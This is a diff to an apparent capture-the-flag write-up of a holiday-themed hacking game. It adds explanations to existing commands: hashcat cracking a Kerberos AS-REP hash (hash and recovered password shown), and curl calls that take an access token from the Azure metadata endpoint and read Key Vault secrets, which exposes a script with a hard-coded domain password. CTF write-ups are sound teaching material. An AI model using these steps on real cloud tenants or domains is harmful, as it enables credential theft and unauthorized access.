@@ -700,9 +700,15 @@ According to the documentation, the hashcat mode for this hash type is 18200. Le
 hashcat -m18200 hash.txt password_list.txt -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 --force
 ```
 
+After running the hash through hash cat and passing the provided kernel accelerator
+parameters, we get the following password:
+
+
 ```
 $krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
 ```
+
+We then send it to the runtoanswer binary as proof of work.
 
 ```sh
 /bin/runtoanswer "IluvC4ndyC4nes!"
@@ -1573,7 +1579,7 @@ The go-date and go-time fields only accepted 4 digits. I supplied `1224` and `16
 
 The I pressed the transmission button (Tx). Nothing happened.
 
-At this point, I made a guess and changed the go-time to 1200, since, 12/24 12:00 is super exciting.
+At this point, I made a guess and changed the go-time to 1200, since 12/24 12:00 is super exciting.
 Fortunately, this worked and greeted me with a picture of elves.
 
 
@@ -1585,6 +1591,10 @@ our gameboy cartridge detector beeps and we get the third volume to "Elf the Dwa
 # Steampunk Island: Coggoggle Marina
 
 ## Active Directory
+
+For this Active Directory challenge,
+we explored the Microsoft Azure Key Vault using the Curl command,
+and issuing an HTTP request to management.azure.com's API.
 
 ```bash
 TOKEN=$(curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' --header "Metadata: true" | jq -r .access_token)
@@ -1652,6 +1662,9 @@ curl --header "$HEADER" "https://management.azure.com/subscriptions/2b0942f3-9bc
 }
 ```
 
+We can query for the North Pole IT KV Key Vault Store,
+and subsequently we get the following JSON.
+
 ```sh
 curl --header "$HEADER" "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01" \
 | jq
@@ -1692,6 +1705,8 @@ curl --header "$HEADER" "https://management.azure.com/subscriptions/2b0942f3-9bc
 }
 ```
 
+If we list the secrets, we can see a script known as tmpAddUserScript inside the Azure Vault.
+
 ```sh
 TOKEN=$(curl --http1.1 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' --header "Metadata: true" | jq -r .access_token)
 HEADER="Authorization: Bearer $TOKEN"
@@ -1717,6 +1732,8 @@ curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets?maxresu
 }
 ```
 
+Now that we know the name of the secret, we can query its value directly by appending it to the request URL.
+
 ```sh
 curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?maxresults=1&api-version=7.4" | jq
 ```
@@ -1736,9 +1753,16 @@ curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddU
 }
 ```
 
+This returns a JSON object with a lot of unnecessary attributes, so to fetch the
+value of the script in its raw form we can repeat the request with jq with the
+`-r` flag and the `value` argument.
+
+
 ```sh
 curl --header "$HEADER" "https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?maxresults=1&api-version=7.4" | jq -r .value
 ```
+
+Inside the retrieved PowerShell script, we find that the password to the Active Directory box is hard-coded.
 
 ```powershell
 Import-Module ActiveDirectory; $UserName = "elfy"; $UserDomain = "northpole.local"; $UserUPN = "$UserName@$UserDomain"; $Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force; $DCIP = "10.0.0.53"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
